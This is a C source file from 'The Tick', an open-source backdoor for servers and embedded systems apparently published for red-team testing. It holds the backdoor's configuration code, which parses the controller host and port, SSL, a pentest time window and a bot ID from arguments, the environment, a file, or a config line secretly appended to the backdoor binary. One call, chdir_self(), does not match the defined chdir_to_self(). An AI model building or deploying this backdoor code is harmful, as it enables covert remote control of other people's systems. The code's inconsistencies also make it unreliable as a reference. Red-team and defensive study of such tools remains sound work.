/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "config.h"
#include "base64.h"
#include "uuid4.h"

/****************************************************************************/

#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE || TICK_CONFIG_USE_BIN

// Pointer to option handler function.
typedef int (*OptionHandler)(char *input, void *output, size_t size);

// Option definition structure.
typedef struct {
    char *name;             // Name of the option (without dashes).
    size_t offset;          // Offset of the Settings struct member.
    size_t size;            // Size of the Settings struct member.
    OptionHandler handler;  // Handler function to parse the value.
} Option;

// Option handler functions for all supported types.

int _option_str(char *input, void *output, size_t size)
{
    strncpy(output, input, size);
    return 0;
}

int _option_int(char *input, void *output, size_t size)
{
    if (size != sizeof(int)) return -1;
    *((int *)(output)) = atoi(input);
    return 0;
}

int _option_bool(char *input, void *output, size_t size)
{
    if (size != sizeof(int)) return -1;
    int i = atoi(input);
    if (i != 0) i = 1;
    *((int *)(output)) = i;
    return 0;
}

int _option_uuid(char *input, void *output, size_t size)
{
    if (size != 16) return -1;
    return uuid_decode(input, output);
}

#if TICK_FEATURES_CRYPTO
int _option_base64(char *input, void *output, size_t size)
{
    if (size < 5) return -1;
    size_t length = base64_decode(input, output, size - 1);
    if (length == 0) return -1;
    *((char *)(output) + length) = 0;
    return 0;
}
#endif

#if TICK_FEATURES_TIME_LIMIT
int _option_timestamp(char *input, void *output, size_t size)
{
    if (size != sizeof(time_t)) return -1;
    *((time_t *)(output)) = strtol(input, NULL, 10);
    return 0;
}
#endif

#if TICK_CONFIG_USE_FILE
int _handler_config_file(char *input, void *output, size_t size)
{
    static int depth = 0;
    int res = -1;
    if (size == sizeof(Settings)) {
        depth++;
        if (depth <= TICK_MAX_CONFIG_FILE_DEPTH) {
            res = parse_config_file((Settings *) output, input);
        }
        depth--;
    }
    return res;
}
#endif

// Aliases for the functions above.
#define OPTION_STRING    _option_str
#define OPTION_NUMBER    _option_int
#define OPTION_FLAG      _option_bool
#define OPTION_TIMESTAMP _option_timestamp
#define OPTION_UUID      _option_uuid
#define OPTION_BLOB      _option_base64
#define HANDLER_CONFIG   _handler_config_file

// Macro to populate the Options structure more easily.
#define DEFINE_OPTION(name, member, handler) { name, offsetof(Settings, member), sizeof(((Settings*)0)->member), handler }
#define DEFINE_CALLBACK(name, handler) { name, 0, sizeof(Settings), handler }

// Status Options structure with the supported options that will be parsed.
// Every option works as a positional argument based on the index of this table.
// Make sure every option name begins with a different letter!
static const Option options_table[] = {

    DEFINE_OPTION("host",   hostname,   OPTION_STRING),
    DEFINE_OPTION("port",   port,       OPTION_NUMBER),

#if TICK_FEATURES_TIME_LIMIT
    DEFINE_OPTION("begin",  start_time, OPTION_TIMESTAMP),
    DEFINE_OPTION("end",    end_time,   OPTION_TIMESTAMP),
#endif

#if TICK_FEATURES_CRYPTO
    DEFINE_OPTION("ssl",    use_ssl,    OPTION_FLAG),
    // TODO add certificate stuff here
#endif

    // Undocumented option, used internally. Careful with it!
    // There should never be two bots with the same ID!
    DEFINE_OPTION("uuid",   uuid,       OPTION_UUID),

#if TICK_CONFIG_USE_FILE
    DEFINE_CALLBACK("config", HANDLER_CONFIG)
#endif

};
static const int options_count = sizeof(options_table) / sizeof(options_table[0]);
static const int options_positionals = 2;       // just hostname and port

// Find an option by short name (the first character).
// Returns an index into options_table[] or -1 if not found.
int find_short_option(char c)
{
    int i;
    for (i = 0; i < options_count; i++) {
        if (c == options_table[i].name[0]) {
            return i;
        }
    }
    return -1;
}

// Find an option by full name.
// Returns an index into options_table[] or -1 if not found.
int find_long_option(char *option)
{
    int i;
    for (i = 0; i < options_count; i++) {
        if (strcmp(option, options_table[i].name) == 0) {
            return i;
        }
    }
    return -1;
}

// Parse a single option value directly into the Settings structure.
// Returns 0 on success or -1 on failure.
int parse_option(Settings *s, int option_index, char *input)
{
    OptionHandler handler = options_table[option_index].handler;
    void *output = ((char *)s + options_table[option_index].offset);
    size_t size = options_table[option_index].size;
    return (*handler)(input, output, size);
}

// Parse the command line options directly into the Settings structure.
// This function will try its best to parse even if there are errors,
// but still returns 0 on success or -1 on failure.
int parse_command_line(Settings *s, int argc, char *argv[], int skip_first)
{
    int success = 0;
    int option_index;
    int pos = 0;
    int final = 0;
    int first = skip_first ? 1 : 0;

    // Trivial case.
    if (argc <= first) {
        return 0;
    }

    // Loop for every command line argument except the first.
    // The first argument is assumed to be the executable.
    int i = first;
    while (i < argc) {
        option_index = -1;

        // Determine if it's a short option, a long option, or a positional.
        // Then find the option in options_table and set option_index.
        if (!final && argv[i][0] == '-') {
            if (argv[i][1] == '-') {
                if (argv[i][2] == 0) {

                    // It's a "--" on its own.
                    // This turns off option parsing,
                    // leaving only positional arguments.
                    final = 1;
                    i++;
                    continue;

                }

                // It's a long option.
                option_index = find_long_option(&argv[i][2]);
                i++;

            } else if (argv[i][2] == 0) {

                // It's a short option.
                option_index = find_short_option(argv[i][1]);
                i++;

            }
        } else {

            // It's a positional.
            if (pos >= options_positionals) {
                success = -1;
                i++;
                continue;
            }
            option_index = pos;
            pos++;

        }
        if (option_index < 0) {
            success = -1;
                i++;
            continue;
        }
        if (i == argc) break;

        // Parse the option.
        if (parse_option(s, option_index, argv[i]) < 0) {
            return -1;
        }

        // Next token.
        i++;
    }

    // Return 0 on success, -1 on failure.
    return success;
}

// Tokenize the given string in place and place pointers to each argument
// in the given array. If NULL is passed instead of an array, the function
// merely counts the number of tokens instead without modifying anything.
// That way by calling the function twice you can measure the size of the
// array, then allocate and populate it.
int split_command_line(char *cmdline, char *argv[])
{
    int count = 0;
    char *token = NULL;
    char current = 0;
    char quote = 0;

    // Prevent crashes if we call this function wrong.
    if (cmdline == NULL) return 0;

    // Loop until the command line string is over.
    while ((current = *cmdline) != 0) {

        // If we have not yet found a token...
        if (token == NULL) {

            // If we have a quote character, we have a quoted token.
            if (current == '"' || current == '\'') {
                quote = current;
                token = cmdline + 1;

            // If we have a backslash...
            } else if (current == '\\') {
                if (argv != NULL) {
                    strcpy(cmdline, cmdline + 1);
                }

                // If the backslash was escaping whitespace, skip it.
                // If not, we have an unquoted token, because a backslash
                // before a quote character makes it a literal.
                current = *cmdline;
                if (current == 0) break;
                if (
                    current != ' ' && current != '\t' &&
                    current != '\r' && current != '\n')
                {
                    token = cmdline;
                }

            // If we have a non whitespace, we have an unquoted token.
            } else if (
                    current != ' ' && current != '\t' &&
                    current != '\r' && current != '\n')
            {
                token = cmdline;
            }

        // If we're in a token...
        } else {

            // If we have a backslash, skip it.
            if (current == '\\') {
                if (argv != NULL) {
                    strcpy(cmdline, cmdline + 1);
                }
                cmdline++;

            // Is it a quoted token?
            } else if (quote != 0) {

                // If we found the closing quote, end the token.
                if (current == quote) {
                    quote = 0;
                    if (argv != NULL) {
                        *cmdline = 0;
                        argv[count] = token;
                    }
                    token = NULL;
                    count++;
                }

            // Is it an unquoted token?
            } else {

                // If we found whitespace, end the token.
                if (
                        current == ' ' || current == '\t' ||
                        current == '\r' || current == '\n')
                {
                    if (argv != NULL) {
                        *cmdline = 0;
                        argv[count] = token;
                    }
                    token = NULL;
                    count++;
                }
            }
        }

        // Next character.
        cmdline++;
    }

    // If we broke out of the loop and there was still a token queued,
    // count it and add it to the array.
    if (token != NULL) {
        if (argv != NULL) {
            *cmdline = 0;
            argv[count] = token;
        }
        count++;
    }

    // Return the count of tokens.
    return count;
}

// Parse command line arguments passed via the environment.
int parse_environment(Settings *s)
{
    char *env = getenv(QUOTE(TICK_CONFIG_ENV_NAME));
    if (env != NULL) {
        int argc = split_command_line(env, NULL);
        if (argc > 0) {
            char *argv[argc];
            memset(argv, 0, sizeof(argv));
            split_command_line(env, argv);
            return parse_command_line(s, argc, argv, 0);
        }
    }
    return 0;
}

// Parse command line arguments passed via a file.
int parse_config_file(Settings *s, char *filename)
{

    // Open the file.
    LOG("Using configuration file: %s\n", filename);
    int fd = open(filename, O_RDONLY | O_SEQUENTIAL);
    if (fd < 0) {
        LOG("Error opening config file!\n");
        return -1;
    }

    // Parse the file.
    int success = parse_config_fd(s, fd);

    // Close the file and return.
    close(fd);
    return success;
}

// Read file contents until the file is over or a maximum is reached.
// File contents are assumed to be text.
// If the file cannot be opened, abort.
// If the file is too large, it will be silently truncated.
// Returns number of bytes on success or -1 on failure.
// Output buffer contains the text read, followed by a null terminator.
ssize_t load_file_contents(int fd, char *buffer, size_t size)
{
    memset(buffer, 0, size);
    ssize_t remaining = size - 1; // null terminated
    ssize_t chunk = -1;
    char *ptr = buffer;
    ssize_t count = 0;
    while (remaining > 0) {
        chunk = read(fd, ptr, remaining);
        if (chunk == 0) break;
        if (chunk < 0) {
            return -1;
        }
        count += chunk;
        ptr += chunk;
        remaining -= chunk;
    }
    return count;
}

// Parse command line arguments read from an open file descriptor.
int parse_config_fd(Settings *s, int fd)
{
    int success = 0;

    // If the buffer is small, use the stack.
    // If it's large, use the heap.
#if TICK_MAX_CONFIG_FILE_SIZE > 0x1000
    char *buffer = malloc(TICK_MAX_CONFIG_FILE_SIZE);
    if (buffer == NULL) return -1;
#else
    char buffer[TICK_MAX_CONFIG_FILE_SIZE];
#endif

    // Read the entire contents of the file into memory.
    // If the file cannot be opened, abort.
    // If the file is too large, it will be silently truncated.
    if (load_file_contents(fd, buffer, TICK_MAX_CONFIG_FILE_SIZE) < 0) {
        success = -1;
    } else {

        // Parse the configuration file.
        int argc = split_command_line(buffer, NULL);
        if (argc > 0) {
            char *argv[argc];
            memset(argv, 0, sizeof(argv));
            split_command_line(buffer, argv);
            success = parse_command_line(s, argc, argv, 0);
        }
    }

    // Free the memory and return.
#if TICK_MAX_CONFIG_FILE_SIZE > 0x1000
    free(buffer);
#endif
    return success;
}

// Determines the name of our own binary.
// Works for both standalone programs and shared libraries.
// Returns the number of characters *required* for the filename;
// if the buffer is smaller than that it will be truncated.
// You can detect this by comparing the return value to the
// number of characters that fit in your buffer.

#if defined (_WIN32)

size_t get_self_filename(char *output, size_t size)
{
    HMODULE hModule = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (void *) get_self_filename, &hModule);
    memset(output, 0, size);    // needed on XP
    return GetModuleFileNameA(hModule, output, size);
}

#elif defined (__ANDROID__)

// We don't have dladdr() consistently in all Android versions or archs,
// but we do know we have support for /proc/self/maps so let's parse that.
// I would prefer to detect this more accurately at compile time but sadly
// it only gives an error when linking, so there's nothing I can do.

size_t get_self_filename(char *output, size_t size)
{
    // "%s-%s %s %s %s %s\t%s\n",addr1,addr2,perm,offset,dev,inode,pathname
    size_t libname_len = 0;
    FILE *f = fopen("/proc/self/maps", "r");
    if (f != NULL) {
        for (;;) {
            char *line = NULL;
            size_t line_len = 0;
            if (getline(&line, &line_len, f) < 0) break;
            char *dash = strchr(line, '-');
            if (dash != NULL) {
                char *space = strchr(dash, ' ');
                if (space != NULL) {
                    size_t len = strlen(line);
                    line[len - 1] = 0;
                    char *libname = strrchr(line, '\t');
                    if (libname == NULL) {
                        libname = strrchr(line, ' ');
                    }
                    if (libname != NULL) {
                        libname++;
                        if (libname[0] == '/') {
                            size_t begin_len = dash - line;
                            size_t end_len = space - (dash + 1);
                            char *begin_str = line;
                            char *end_str = dash + 1;
                            begin_str[begin_len] = 0;
                            end_str[end_len] = 0;
                            char *tmp;
                            size_t begin = strtoul(begin_str, &tmp, 16);
                            size_t end = strtoul(end_str, &tmp, 16);
                            size_t myself = (size_t) &get_self_filename;
                            if (begin < myself && myself < end) {
                                memset(output, 0, size);
                                strncpy(output, libname, size);
                                libname_len = strlen(libname);
                            }
                            break;
                        }
                    }
                }
            }
            free(line);
        }
    }
    return libname_len;
}

#else

// Using a non-standard GNU extension, dladdr().
// If you're building for some platform that doesn't support this,
// check out the Android solution.

// TODO: on BSD neither trick will work, but there is another similar
// function that can be used.

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#ifndef __USE_GNU
#define __USE_GNU
#endif
#include <dlfcn.h>

size_t get_self_filename(char *output, size_t size)
{
    Dl_info info;
    memset(&info, 0, sizeof(info));
    if (dladdr(get_self_filename, &info)) {
        memset(output, 0, size);
        strncpy(output, info.dli_fname, size);
        return strlen(info.dli_fname);
    }
    return 0;
}

#endif

// Change the current directory to where our binary is located.
void chdir_to_self()
{
    char pathname[512];
    if (get_self_filename(pathname, sizeof(pathname))) {
        dirname(pathname);
        LOG("Switching to directory: %s\n", pathname);
        chdir(pathname);
    }
}

// Embedded configuration files are just tacked at the end of the binary.
// This works because all binary formats in all platforms have their own
// internal structure and any data past the end of the code is ignored.
// To avoid having to actually be aware of each binary file format, we
// just start reading backwards from the end of the file until we reach a
// newline character. This works because we know the config data is always
// separated from the binary with a newline, and the config itself must be
// in a single line, so we can't accidentally take a byte from the code.

// On success, returns a file descriptor already positioned right where the
// config data is located. On error returns -1. If no embedded config is
// present returns -2. The caller must close the file descriptor.
int open_self_config()
{
    // Get our own pathname.
    char filename[512];
    if (get_self_filename(filename, sizeof(filename)) == 0) {
        LOG("Error getting my own pathname!\n");
        return -1;
    }

    // Open our own file.
    int fd = open(filename, O_RDONLY | O_BINARY | O_SEQUENTIAL);
    if (fd < 0) {
        LOG("Error opening my own binary!\n");
        return -1;
    }

    // Go to the end of the file and read backwards until finding a newline.
    size_t filesize = lseek(fd, -1, SEEK_END);
    for (;;) {
        char c = 0;
        if (read(fd, &c, 1) <= 0) {
            LOG("Error reading myself!\n");
            close(fd);
            return -1;
        }
        if (c == '\n') break;
        size_t pos = lseek(fd, -2, SEEK_CUR);
        if (pos == 0 || (filesize - pos) > TICK_MAX_CONFIG_FILE_SIZE) {
            LOG("Embedded configuration not found\n");
            close(fd);
            return -2;
        }
    }

    // Return the open file descriptor.
    // It's the caller's responsibility to close it.
    return fd;
}

int parse_embedded_config_file(Settings *s)
{
    // Open the binary and find the configuration.
    int fd = open_self_config();

    // Parse the file.
    int success = parse_config_fd(s, fd);

    // Close the file and return.
    close(fd);
    return success;
}

#endif

/****************************************************************************/

void get_default_configuration(Settings *s)
{
    // Zero out the memory structure for the settings.
    // We need this because not all values will be set by the code below.
    memset(s, 0, sizeof(Settings));

    // Now initialize again to the default values.
    // These can be controlled at compile time from the makefile.
    // Useful for situations where you can't find a way to pass the
    // configuration to the bot, so you just make a custom build.
#ifdef TICK_CONFIG_HOSTNAME
    strncpy(s->hostname, TICK_CONFIG_HOSTNAME, sizeof(s->hostname));
#endif
#ifdef TICK_CONFIG_PORT
    s->port = TICK_CONFIG_PORT;
#endif
#if TICK_FEATURES_TIME_LIMIT
# ifdef TICK_CONFIG_TIME_LIMIT_START
    s->start_time = TICK_CONFIG_TIME_LIMIT_START;
# endif
# ifdef TICK_CONFIG_TIME_LIMIT_END
    s->end_time = TICK_CONFIG_TIME_LIMIT_END;
# endif
#endif
#if TICK_FEATURES_CRYPTO
#ifdef TICK_CONFIG_USE_SSL
    s->use_ssl = TICK_CONFIG_USE_SSL;
#endif
#endif
}

void get_configuration(Settings *s, int argc, char *argv[])
{
    // Initialize the structure with the default configuration.
    get_default_configuration(s);

    // If we have an embedded configuration data, parse it now.
#if TICK_CONFIG_USE_BIN
#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV
    if (parse_embedded_config_file(s) == -1) {
        LOG("Error parsing embedded configuration! Continuing regardless...\n");
    }
#else
#endif
#endif

    // If we have a built in configuration file name, parse it now.
    // Assume a relative pathname will be relative to where our binary is
    // located, rather than whatever the current directory happens to be.
#if TICK_CONFIG_USE_FILE && defined (TICK_CONFIG_FILE_NAME)
    chdir_self();
    if (parse_config_file(s,  TICK_CONFIG_FILE_NAME) < 0) {
        LOG("Error parsing configuration file! Continuing regardless...\n");
    }
#endif

    // If environment variable parsing is enabled, do it now.
#if TICK_CONFIG_USE_ENV
    if (parse_environment(s) < 0) {
        LOG("Error parsing environment variable! Continuing regardless...\n");
    }
#endif

    // If argv parsing is enabled, do it now.
#if TICK_CONFIG_USE_ARGV
    if (parse_command_line(s, argc, argv, 1) < 0) {
        LOG("Error parsing command line! Continuing regardless...\n");
    }
#endif
}

#if TICK_VERBOSE && (TICK_CONFIG_USE_ARGV || TICK_CONFIG_ENV)

int check_for_help(int argc, char *argv[])
{
# if TICK_CONFIG_USE_ARGV
    if (argc > 1) {
        int x;
        for (x = 1; x < argc; x++) {
            if (strcmp(argv[x], "--help") == 0) {
                show_help(NULL, argv[0]);
                return -1;
            }
        }
    }
# endif
# if TICK_CONFIG_USE_ENV
    char *env = getenv(QUOTE(TICK_CONFIG_ENV_NAME));
    if (env != NULL) {
        env = strstr(env, "--help");
        if (env != NULL) {
            show_help(NULL, argv[0]);
            return -1;
        }
    }
# endif
    return 0;
}

// Show a user friendly help message.
// For a smarter message pass it the Settings structure and argv[0].
// These are optional, however.
void show_help(Settings *s, char *execname)
{
    // Start by showing the banner.
    PRINT("\nThe Tick, a simple backdoor for servers and embedded systems.\n");

    // We have a different usage message depending on whether we parse command
    // line arguments, environment strings, a config file, or nothing at all.
    // We can improve the message if we know argv[0]. If we don't, make it up.
#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV
    if (execname == NULL) {
#ifdef _WIN32
        execname = "ticksrv.exe";
#else
        execname = "./ticksrv";
#endif
    } else {
        execname = basename(execname);
    }
#if TICK_CONFIG_USE_ARGV
    char *usage =
        "\nUsage:\n"
        "    %s <options>\n"
#else
    char *usage =
        "\nUsage:\n"
        "    "
        QUOTE(TICK_CONFIG_ENV_NAME)
        "=\"<options>\" %s\n"
#endif
        "\nAvailable options:\n"
        "\t-h, --host HOSTNAME\n"
        "\t-p, --port PORT\n"
#if TICK_FEATURES_CRYPTO
        "\t-s, --ssl 1 for SSL, 0 for plaintext\n"
#endif
#if TICK_FEATURES_TIME_LIMIT
        "\t-b, --begin EPOCH\n"
        "\t-e, --end EPOCH\n"
#endif
#if TICK_CONFIG_USE_FILE
        "\t-c, --config FILE\n"
#endif
        ;
    PRINT(usage, execname);
#endif

    // We can improve the message if we know the settings.
    // If we don't, just assume the default settings.
    Settings tmp;
    if (s == NULL) {
        s = &tmp;
        get_default_configuration(s);
    }

    // If there is a pentesting time window, show it.
    // Hopefully it will put some poor sysadmin's mind at ease...
#if TICK_FEATURES_TIME_LIMIT
    if (s->start_time > 0 || s->end_time > 0) {
        time_t now = time(NULL);
        char start_str[80];
        char end_str[80];
        if (s->start_time > 0) {
            struct tm start_tm;
            start_tm = *localtime(&s->start_time);
            strftime(start_str, sizeof(start_str), "%a %Y-%m-%d %H:%M:%S %Z", &start_tm);
        } else {
            strcpy(start_str, "any time");
        }
        if (s->end_time > 0) {
            struct tm end_tm;
            end_tm = *localtime(&s->end_time);
            strftime(end_str, sizeof(end_str), "%a %Y-%m-%d %H:%M:%S %Z", &end_tm);
        } else {
            strcpy(end_str, "forever");
        }
        PRINT("\nPentesting time window:\n");
        if (s->start_time > 0 && s->start_time > now) {
            PRINT(" Start date: %s (not yet started)\n", start_str);
        } else {
            PRINT(" Start date: %s\n", start_str);
        }
        if (s->end_time > 0 && s->end_time <= now) {
            PRINT("   End date: %s (completed)\n", end_str);
        } else {
            PRINT("   End date: %s\n", end_str);
        }
    }
#endif

    // If we have a hardcoded configuration file, show it.
#if TICK_CONFIG_USE_FILE
#ifdef TICK_CONFIG_FILE_NAME
    PRINT("\n"
        "Configuration file name:\n\t"
        TICK_CONFIG_FILE_NAME
        "\n");
#endif
#endif

    // Finish with a nice message for unsuspecting sysadmins. ;)
    PRINT("\n"
        "This is a backdoor component used for security testing and red team exercises.\n"
        "If you are seeing this software installed on your system, you should probably\n"
        "report the incident to your local security team.\n"
        );
#ifndef _WIN32
    PRINT("\n");
#endif
}

#endif
